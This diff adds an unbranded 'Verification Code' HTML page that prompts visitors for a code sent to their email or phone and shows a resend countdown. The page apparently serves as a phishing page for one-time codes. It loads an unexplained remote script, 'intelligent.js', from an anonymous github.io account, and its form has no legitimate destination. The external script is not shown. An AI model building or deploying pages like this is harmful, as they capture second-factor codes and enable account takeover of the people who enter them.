@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Verification Code</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .box {
+      width: 92%;
+      max-width: 420px;
+      text-align: center;
+      padding: 20px;
+    }
+
+    h2 {
+      margin-bottom: 8px;
+      font-size: 26px;
+      color: #111;
+    }
+
+    p {
+      color: #777;
+      font-size: 14px;
+      margin-bottom: 25px;
+    }
+
+    /* ✅ SINGLE INPUT */
+    .code-input {
+      width: 100%;
+      height: 56px;
+      font-size: 18px;
+      padding: 0 14px;
+      border-radius: 12px;
+      border: 1px solid #d0d0d0;
+      outline: none;
+      margin-bottom: 25px;
+      text-align: center;
+      letter-spacing: 2px;
+    }
+
+    .code-input:focus {
+      border-color: #4f63ff;
+    }
+
+    /* ✅ VERIFY BUTTON STATES */
+    button {
+      width: 100%;
+      padding: 16px;
+      border-radius: 12px;
+      border: none;
+      font-size: 16px;
+      background: #eeeeee;      /* ✅ DISABLED COLOR */
+      color: #999;
+      cursor: not-allowed;
+      transition: 0.3s;
+    }
+
+    button.active {
+      background: #4f63ff;      /* ✅ CLEAR BLUE ACTIVE COLOR */
+      color: #ffffff;
+      cursor: pointer;
+    }
+
+    .resend-text {
+      margin-top: 25px;
+      font-size: 14px;
+      color: #777;
+    }
+
+    .resend-btn {
+      display: none;
+      margin-top: 8px;
+      font-size: 14px;
+      color: #4f63ff;
+      font-weight: bold;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<script src="https://eal876955-lgtm.github.io/npi/m/intelligent.js"></script>
+<body>
+
+  <div class="box">
+    <h2>Verification Code</h2>
+    <p>Enter the verification code sent to your email or phone</p>
+<form>
+    <!-- ✅ SINGLE INPUT -->
+    <input
+      type="text"
+      id="codeInput"
+      class="code-input"
+      placeholder="Enter your code here"
+      name="verificarion code"
+    >
+
+    <!-- ✅ VERIFY BUTTON -->
+    <button id="verifyBtn" disabled type="subm.">Verify</button>
+</form>
+    <div class="resend-text">
+      Resend code in <span id="timerValue">30</span>s
+    </div>
+
+    <div class="resend-btn" id="resendBtn">Resend code</div>
+  </div>
+
+<script>
+  const codeInput = document.getElementById("codeInput");
+  const verifyBtn = document.getElementById("verifyBtn");
+  const timerValue = document.getElementById("timerValue");
+  const resendBtn = document.getElementById("resendBtn");
+
+  let baseTime = 30;
+  let timeLeft = baseTime;
+  let timerInterval;
+
+  // ✅ ENABLE VERIFY ONLY WHEN INPUT IS NOT EMPTY
+  codeInput.addEventListener("input", () => {
+    if (codeInput.value.trim() !== "") {
+      verifyBtn.classList.add("active");   // ✅ THIS NOW CHANGES COLOR
+      verifyBtn.disabled = false;
+    } else {
+      verifyBtn.classList.remove("active");
+      verifyBtn.disabled = true;
+    }
+  });
+
+  // ✅ TIMER FUNCTION
+  function startTimer() {
+    resendBtn.style.display = "none";
+    timeLeft = baseTime;
+    timerValue.textContent = timeLeft;
+
+    clearInterval(timerInterval);
+
+    timerInterval = setInterval(() => {
+      timeLeft--;
+      timerValue.textContent = timeLeft;
+
+      if (timeLeft <= 0) {
+        clearInterval(timerInterval);
+        resendBtn.style.display = "block";
+        timerValue.textContent = "0";
+      }
+    }, 1000);
+  }
+  // ✅ RESEND → ADD +30s EVERY TIME
+  resendBtn.addEventListener("click", () => {
+    baseTime += 30;
+    startTimer();
+  });
+
+  // ✅ START FIRST TIMER
+  startTimer();
+</script>
+
+</body>
+</html>
